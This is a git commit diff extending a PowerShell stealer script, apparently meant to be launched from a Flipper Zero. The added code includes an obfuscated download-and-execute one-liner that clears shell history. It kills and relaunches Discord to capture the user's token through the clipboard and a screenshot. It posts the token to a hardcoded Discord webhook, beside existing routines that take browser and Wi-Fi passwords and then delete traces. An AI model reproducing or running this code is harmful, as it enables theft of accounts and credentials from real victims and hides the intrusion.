f2a3167ea026c3a6fb92c57d00edc8d38b1560c3
El0sk1r <125088833+El0sk1r@users.noreply.github.com>
2023-02-10 21:25:28 +0100

    Update jestemzajebisty.ps1

--- .github/workflows/jestemzajebisty.ps1
+++ .github/workflows/jestemzajebisty.ps1
@@ -1,3 +1,9 @@
+#Payload to execute in your flipperZero: this dowload, execute and clear history
+#$n='i';set-alias v $n'wr';$b=[char]116;$c=[char]47;$a=$([char]104+$b+$b+[char]112+[char]58+$c+$c);IEX (v -usebasicparsing $a'raw.githubusercontent.com/s4dic/DiscordGrabber/main/bd.ps1?token=GHSAT0AAAAAABXCYHCCGGWFF43MHDED24HEYXT6JBQ'); PSReadLine; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); exit
+
+#Todo:
+# Correct the Edge password error
+
 #CHANGE URL TO YOUR URL
   $url="https://discordapp.com/api/webhooks/1073698076352577558/oPvFFNwDe9AuENvn6Ox395zGQuNUv98OCMBmupWMskgswGvzSg7idOtIzj20WHm0rfgB" ;
 #Get PC Name+Date+Time
@@ -37,9 +43,25 @@ echo "" > "$env:temp\WIFI-$namepc.txt";
   echo '    }' >> "d.ps1";
   echo '}' >> "d.ps1";
   echo 'Get-ScreenCapture' >> "d.ps1";
+  sleep 1
   $screencapture = echo $env:temp"\"$env:UserName"_Capture"
   powershell -c $env:temp\d.ps1;
   $Screencap = "$env:temp\d.ps1";
+
+#New token Grab Method Aug 2022
+  taskkill /IM Discord.exe /F
+  taskkill /IM Discord.exe /F
+  gci $env:appdata\..\local\Discord\app-*\ | ? { $_.PSIsContainer } | sort CreationTime -desc | select -f 1 | cd;
+  .\Discord.exe --remote-debugging-port=9222
+
+#Get Discord Folder (deprecated function)
+#  #Discord ZIP
+#    Add-Type -Assembly "System.IO.Compression.FileSystem" ;
+#  #Kill Discord
+#    taskkill /IM Discord.exe /F
+#    cd C:\Users\$env:UserName\AppData\Local\Discord\app-*\; .\Discord.exe --remote-debugging-port=9222;
+#Define zip to copy
+#  $tokenfile = "$env:temp\Discord-Token-$namepc.zip"
 
 # Get PC information
   dir env: >> "$env:temp\stats-$namepc.txt";
@@ -53,7 +75,7 @@ echo "" > "$env:temp\WIFI-$namepc.txt";
   Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
   Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
 
-# Get FireFox Password
+#Get FireFox Password
   #firefox ZIP
     Add-Type -Assembly "System.IO.Compression.FileSystem" ;
   #Kill Firefox
@@ -105,6 +127,49 @@ $chromepassword = "$env:temp\Chrome-Password-$namepc.zip"
 #Define zip to copy
 $edgepassword = "$env:temp\Edge-Password-$namepc.zip"
 
+#Backup Edge folder to star with empty edge browser, to get Token with flipper
+  #Kill Edge Again
+    taskkill /IM msedge.exe /F
+    mv $env:APPDATA\..\Local\Microsoft\Edge $env:APPDATA\..\Local\Microsoft\ZZZZZZZ
+
+#Sleep 60 to wait flipperzero action on discord token
+sleep 60
+
+#get discord token with Clipboard Method
+  Get-Clipboard >> "$env:temp\tk.txt";
+  $token =Get-content -tail 1 "$env:temp\tk.txt";
+  echo "" >> "$env:temp\stats-$namepc.txt";
+  echo "Discord Token" >> "$env:temp\stats-$namepc.txt";
+  echo "########" >> "$env:temp\stats-$namepc.txt";
+  echo $token >> "$env:temp\stats-$namepc.txt";
+  echo "########" >> "$env:temp\stats-$namepc.txt";
+
+  # Screenshot Token for Backup if clipboard Fail:
+  cd "$env:temp";
+  echo 'function Get-ScreenCapture' > "d.ps1";
+  echo '{' >> "d.ps1";
+  echo '    begin {' >> "d.ps1";
+  echo '        Add-Type -AssemblyName System.Drawing, System.Windows.Forms' >> "d.ps1";
+  echo '        Add-Type -AssemblyName System.Drawing' >> "d.ps1";
+  echo '        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |' >> "d.ps1";
+  echo '            Where-Object { $_.FormatDescription -eq "JPEG" }' >> "d.ps1";
+  echo '    }' >> "d.ps1";
+  echo '    process {' >> "d.ps1";
+  echo '        Start-Sleep -Milliseconds 44' >> "d.ps1";
+  echo '            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")' >> "d.ps1";
+  echo '        Start-Sleep -Milliseconds 550' >> "d.ps1";
+  echo '        $bitmap = [Windows.Forms.Clipboard]::GetImage()' >> "d.ps1";
+  echo '        $ep = New-Object Drawing.Imaging.EncoderParameters' >> "d.ps1";
+  echo '        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)' >> "d.ps1";
+  echo '        $screenCapturePathBase = $env:temp + "\" + $env:UserName + "Token_Capture"' >> "d.ps1";
+  echo '        $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep)' >> "d.ps1";
+  echo '    }' >> "d.ps1";
+  echo '}' >> "d.ps1";
+  echo 'Get-ScreenCapture' >> "d.ps1";
+  $tokencapture = echo $env:temp"\"$env:UserName"Token_Capture"
+  powershell -c $env:temp\d.ps1;
+  $Screencap = "$env:temp\d.ps1";
+
 #UPLOAD
 cd $env:temp
 # Send Name Computer to discord
@@ -114,6 +179,15 @@ cd $env:temp
   curl.exe -F "file1=@stats-$namepc.txt" $url;
 # Upload wifi password
   curl.exe -F "file2=@WIFI-$namepc.txt" $url;
+# Upload Token Clipboard
+  $Body=@{ content = "**Discord Token:** ||$token||"};
+  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
+# Upload Token Screenshot Backup
+  $Body=@{ content = "**Token Capture Backup if clipBoard Fail:**"};
+  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
+  curl.exe -F "file2=@$tokencapture.jpg" $url;
+# Upload Discord Token (deprecated function)
+#  curl.exe -i -F file=@"$tokenfile" $url
 
 # Upload Webbroser Password Pwned
   $Body=@{ content = "**Web Browsers Password Pwned**"};
@@ -140,6 +214,8 @@ cd $env:temp
   mv $env:APPDATA\..\Local\Microsoft\ZZZZZZZ $env:APPDATA\..\Local\Microsoft\Edge
 
 #Delete all file
+# Delete ZIP Discord Token (deprecated function)
+# Remove-Item  "$tokenfile" -Force -Recurse;
 # Delete stat
   Remove-Item "stats-$namepc.txt" -Force -Recurse;
 # Delete wifi password
@@ -148,6 +224,8 @@ cd $env:temp
   Remove-Item  $screencapture* -Force -Recurse;
 # Delete token screencapture
   Remove-Item  $tokencapture* -Force -Recurse;
+#  Delete token file
+  Remove-Item  "$env:temp\tk.txt"; -Force -Recurse;
 # Delete firefox password
   Remove-Item  $firefoxpassword -Force -Recurse;
 # Delete Chrome password
@@ -155,9 +233,12 @@ cd $env:temp
 # Delete Edge password
   Remove-Item  $edgepassword -Force -Recurse;
 # Delete this script
-  Remove-Item  $env:temp\e.ps1 -Force -Recurse;
+  Remove-Item  $env:temp\p.ps1 -Force -Recurse;
 # Delete screencapture script
   Remove-Item $env:temp\d.ps1 -Force -Recurse;
+
+#Last discord kill before quit
+taskkill /IM Discord.exe /F
 
 # Clear History powershell:
   [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
